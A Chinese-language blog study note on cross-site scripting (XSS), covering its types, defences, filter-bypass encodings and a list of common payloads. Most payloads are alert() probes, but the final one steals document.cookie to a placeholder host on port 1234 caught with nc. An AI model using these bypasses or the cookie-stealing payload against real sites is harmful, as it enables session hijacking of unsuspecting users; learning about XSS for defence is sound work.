@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="XSS攻击原理XSS攻击：即跨站脚本攻击，是指攻击者在网页中嵌入客户端JavaScript脚本，当用户使用浏览器浏览嵌入恶意代码的网页时，恶意代码将会在用户的浏览器上执行。JavaScript可以用来获取用户cookie、改变网页内容、URL跳转等等，那么存在XSS漏洞的网站就可以盗取用户cookie、黑掉页面、导航到恶意网址等。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web安全学习——XSS攻击">
+<meta property="og:url" content="http:&#x2F;&#x2F;no-timing&#x2F;no-timing.github.io&#x2F;2020&#x2F;04&#x2F;04&#x2F;Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94XSS%E6%94%BB%E5%87%BB&#x2F;index.html">
+<meta property="og:site_name" content="no-timing">
+<meta property="og:description" content="XSS攻击原理XSS攻击：即跨站脚本攻击，是指攻击者在网页中嵌入客户端JavaScript脚本，当用户使用浏览器浏览嵌入恶意代码的网页时，恶意代码将会在用户的浏览器上执行。JavaScript可以用来获取用户cookie、改变网页内容、URL跳转等等，那么存在XSS漏洞的网站就可以盗取用户cookie、黑掉页面、导航到恶意网址等。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-04-13T07:29:21.708Z">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://no-timing/no-timing.github.io/2020/04/04/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94XSS%E6%94%BB%E5%87%BB/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>Web安全学习——XSS攻击 | no-timing</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">no-timing</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/no-timing" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://no-timing/no-timing.github.io/2020/04/04/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94XSS%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ame.jpg">
+      <meta itemprop="name" content="yzz">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="no-timing">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Web安全学习——XSS攻击
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-04-04 16:27:54" itemprop="dateCreated datePublished" datetime="2020-04-04T16:27:54+08:00">2020-04-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-04-13 15:29:21" itemprop="dateModified" datetime="2020-04-13T15:29:21+08:00">2020-04-13</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全学习</span>
+                  </a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h4 id="XSS攻击原理"><a href="#XSS攻击原理" class="headerlink" title="XSS攻击原理"></a>XSS攻击原理</h4><p>XSS攻击：即跨站脚本攻击，是指攻击者在网页中嵌入客户端JavaScript脚本，当用户使用浏览器浏览嵌入恶意代码的网页时，恶意代码将会在用户的浏览器上执行。</p><p>JavaScript可以用来获取用户cookie、改变网页内容、URL跳转等等，那么存在XSS漏洞的网站就可以盗取用户cookie、黑掉页面、导航到恶意网址等。</p><a id="more"></a>
+
+<h4 id="XSS攻击分类"><a href="#XSS攻击分类" class="headerlink" title="XSS攻击分类"></a>XSS攻击分类</h4><ul>
+<li><strong>反射型XSS</strong></li>
+</ul>
+<p>反射性XSS也叫非持久型XSS，是最容易出现的一种XSS漏洞，当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。这个过程就像一次反射，故称为反射型XSS。 </p>
+<ul>
+<li><strong>存储型XSS</strong></li>
+</ul>
+<p>存储型XSS又被称为持久型XSS，存储型XSS是最危险的一种跨站脚本。</p>
+<p>允许用户存储数据的Web应用程序都可能出现存储型XSS漏洞，当攻击提交一段XSS代码后，被服务器端接受并存储，当攻击者再次访问页面时，这段XSS代码就会被读取出来并响应给浏览器，造成XSS跨站攻击。</p>
+<ul>
+<li><strong>DOM型XSS</strong></li>
+</ul>
+<p>DOM（文档对象模型），使用DOM可以允许程序动态的访问和跟新文档的内容和结构。而基于DOM型的XSS是不需要与服务器端交互的，它只发生在客户端处理数据阶段。</p>
+<h4 id="XSS攻击利用"><a href="#XSS攻击利用" class="headerlink" title="XSS攻击利用"></a>XSS攻击利用</h4><p>JavaScript语言非常强大，可以做很多事情，可利用JavaScript做如：经纬度定位、获取HTML源码、H5截屏、端口扫描、CSRF攻击、键盘记录、页面伪造、点击劫持、钓鱼等等。</p>
+<h4 id="XSS攻击修复"><a href="#XSS攻击修复" class="headerlink" title="XSS攻击修复"></a>XSS攻击修复</h4><ul>
+<li><strong>HttpOnly</strong></li>
+</ul>
+<p>HttpOnly最早由微软提出，如今已成为一个标准，浏览器将禁止页面的JavaScript访问带有HttpOnly属性的Cookie。所以，HttpOnly是解决XSS攻击后的Cookie劫持攻击，而不是解决XSS攻击。</p>
+<ul>
+<li><strong>输入检查</strong></li>
+</ul>
+<p>对用户提交的数据进行检查，如长度、类型等检查，或采用XSS Filter过滤器进行XSS检查。</p>
+<ul>
+<li><strong>输出编码</strong></li>
+</ul>
+<p>可采用HTML实体编码HtmlEncode。对&amp;、&lt;、&gt;、”、’、/等进行转义编码。</p>
+<h4 id="XSS构造"><a href="#XSS构造" class="headerlink" title="XSS构造"></a>XSS构造</h4><ul>
+<li><strong>插入&lt;&gt;标记</strong></li>
+</ul>
+<p>如果能插入&lt;&gt;标记，那么就能操作一个html标签，然后通过&lt;script&gt;标签就能插入任意的脚本代码。</p>
+<p>&lt;script&gt;alert(/xss/)&lt;/script&gt;</p>
+<ul>
+<li><strong>利用事件触发</strong></li>
+</ul>
+<p>事件就是浏览器自身执行的某种动作，如click、mouseover、load等，而响应事件的函数叫做事件处理函数（事件侦听器）。如：</p>
+<p>&lt;img src=”#” οnerrοr=alert(/xss/)&gt;</p>
+<p>onerror是IMG标记的一个事件，只要页面中发生错误，该事件立即被激活。</p>
+<h4 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h4><p>大小写绕过：jaVaSCript</p>
+<p>单双引号互用：&lt;img src=’xxx’&gt;、&lt;img src=”xxx”&gt;</p>
+<p>不用引号：&lt;img src=javascript:alert(xss);&gt;</p>
+<p>绕过空格：&lt;img/src=”javascript:alert(‘xss’);”&gt;</p>
+<p>编码绕过：HTML属性值支持ASCII码。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">通用:</span><br><span class="line"> </span><br><span class="line">十进制编码</span><br><span class="line">&lt;img src="#" οnerrοr=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#53;&amp;#47;&amp;#41;&gt;  </span><br><span class="line"> </span><br><span class="line">十六进制编码</span><br><span class="line">&lt;img src="#" οnerrοr=&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x002f;&amp;#x0078;&amp;#x0073;&amp;#x0073;&amp;#x0035;&amp;#x002f;&amp;#x0029;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="XSS常用payload"><a href="#XSS常用payload" class="headerlink" title="XSS常用payload"></a>XSS常用payload</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"x"</span> onerror=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;img src=<span class="string">"1"</span> onerror=<span class="built_in">eval</span>(<span class="string">"alert('xss')"</span>)&gt;</span><br><span class="line">&lt;img src=<span class="number">1</span> onmouseover=alert(<span class="string">'xss'</span>)&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"javascript:alert('xss')"</span>&gt;aa&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">&lt;a href=javascript:eval(alert('xss'))&gt;aa&lt;/</span>a&gt;</span><br><span class="line">&lt;a href=<span class="string">"javascript:aaa"</span> onmouseover=<span class="string">"alert(/xss/)"</span>&gt;aa&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">需要用编码绕过时：</span></span><br><span class="line"><span class="regexp">Base64：&lt;a href=data:text/</span>html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==&gt;M</span><br><span class="line"></span><br><span class="line">urlencode：&lt;a href=data:text/html;%<span class="number">3</span>C%<span class="number">73</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%<span class="number">3</span>E%<span class="number">61</span>%<span class="number">6</span>C%<span class="number">65</span>%<span class="number">72</span>%<span class="number">74</span>%<span class="number">2829</span>%<span class="number">29</span>%<span class="number">3</span>C%<span class="number">2</span>F%<span class="number">73</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%<span class="number">3</span>E&gt;M </span><br><span class="line"></span><br><span class="line">HTML实体编码 ：&lt;a href=j&amp;#x61;v&amp;#97script&amp;#x3A;&amp;#97lert(13)&gt;M</span><br><span class="line">&lt;a href=<span class="string">""</span> onclick=alert(<span class="string">'xss'</span>)&gt;aa&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">&lt;a href="" onclick=eval(alert('xss'))&gt;bb&lt;/</span>a&gt;</span><br><span class="line">&lt;a href=<span class="string">""</span> onmouseover=prompt(<span class="string">'xss'</span>)&gt;cc&lt;<span class="regexp">/a&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">"data:text/html,&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">&lt;iframe src=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="</span>&gt;</span><br><span class="line">&lt;iframe src=<span class="string">"aaa"</span> onmouseover=alert(<span class="string">'xss'</span>) /&gt;<span class="xml"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value=<span class="string">""</span> onclick=alert(<span class="string">'xss'</span>) type=<span class="string">"text"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"name"</span> onmouseover=alert(<span class="string">'xss'</span>)&gt;</span><br><span class="line">&lt;input name=<span class="string">"name"</span> value=<span class="string">""</span> onmouseover=prompt(<span class="string">'xss'</span>) bad=<span class="string">""</span>&gt;</span><br><span class="line">&lt;input value=<span class="number">1</span> type=image src onerror=alert(<span class="number">1</span>) &gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert(<span class="string">'xss'</span>)&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg&gt;标签中可以直接执行实体字符。</span><br><span class="line">&lt;svg&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert&amp;#40;1&amp;#41;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookie盗取：</span><br><span class="line">&lt;script&gt;<span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">"img"</span>);img.src=<span class="string">"http://xxx.xxx.xxx.xxx:1234/a?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">nc监听端口<span class="number">1234</span></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2020/04/04/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94XXE%E6%94%BB%E5%87%BB/" rel="next" title="Web安全学习——XXE攻击">
+                  <i class="fa fa-chevron-left"></i> Web安全学习——XXE攻击
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+                <a href="/2020/04/05/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94OWASP-Top-10/" rel="prev" title="Web安全学习——OWASP-Top-10">
+                  Web安全学习——OWASP-Top-10 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS攻击原理"><span class="nav-text">XSS攻击原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS攻击分类"><span class="nav-text">XSS攻击分类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS攻击利用"><span class="nav-text">XSS攻击利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS攻击修复"><span class="nav-text">XSS攻击修复</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS构造"><span class="nav-text">XSS构造</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS绕过"><span class="nav-text">XSS绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS常用payload"><span class="nav-text">XSS常用payload</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yzz"
+      src="/images/ame.jpg">
+  <p class="site-author-name" itemprop="name">yzz</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yzz</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">286k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:20</span>
+</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
